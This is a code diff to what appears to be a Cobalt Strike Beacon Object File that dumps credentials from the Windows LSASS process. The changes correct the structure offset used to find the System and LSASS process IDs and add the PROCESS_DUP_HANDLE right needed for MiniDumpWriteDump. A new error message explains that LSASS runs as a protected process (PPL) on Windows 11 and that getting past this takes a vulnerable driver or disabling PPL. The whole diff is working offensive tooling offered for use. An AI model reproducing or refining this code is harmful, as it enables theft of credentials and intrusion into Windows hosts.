@@ -336,8 +336,8 @@ static DWORD _find_system_pid(void) {
                     (p[9] == L'e' || p[9] == L'E') &&
                     (p[10] == L'x' || p[10] == L'X') &&
                     (p[11] == L'e' || p[11] == L'E')) {
-                    /* UniqueProcessId at offset 0x48 (x64) */
-                    pid = (DWORD)(*(ULONG_PTR *)(ptr + 0x48));
+                    /* UniqueProcessId at offset 0x50 on x64 */
+                    pid = (DWORD)(*(ULONG_PTR *)(ptr + 0x50));
                     break;
                 }
             }
@@ -1207,7 +1207,9 @@ static DWORD _find_lsass_pid(void) {
                     (p[6] == L'e' || p[6] == L'E') &&
                     (p[7] == L'x' || p[7] == L'X') &&
                     (p[8] == L'e' || p[8] == L'E')) {
-                    pid = (DWORD)(*(ULONG_PTR *)(ptr + 0x48));
+                    /* UniqueProcessId at offset 0x50 on x64
+                     * (0x48 = BasePriority, 0x4C = pad, 0x50 = PID) */
+                    pid = (DWORD)(*(ULONG_PTR *)(ptr + 0x50));
                     break;
                 }
             }
@@ -1316,12 +1318,20 @@ static void _dump_lsass(void) {
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[*] LSASS PID: %d", lsassPid);
 
-    /* Open LSASS */
+    /* Open LSASS — need VM_READ + QUERY_INFO + DUP_HANDLE for MiniDumpWriteDump */
     HANDLE hLsass = KERNEL32$OpenProcess(
-        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
+        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
+        FALSE, lsassPid);
     if (!hLsass) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] LSASS: OpenProcess failed (error %d). Need SeDebugPrivilege or SYSTEM.",
-                     KERNEL32$GetLastError());
+        DWORD err = KERNEL32$GetLastError();
+        if (err == 5) /* ERROR_ACCESS_DENIED — likely LSASS PPL (Win11 default) */
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!] LSASS: Access denied (error 5). LSASS is likely running as PPL.\n"
+                "    On Windows 11, LSASS PPL is enabled by default.\n"
+                "    Bypass requires a vulnerable driver or disabling PPL first.");
+        else
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!] LSASS: OpenProcess failed (error %d). Need SeDebugPrivilege or SYSTEM.", err);
         return;
     }
 
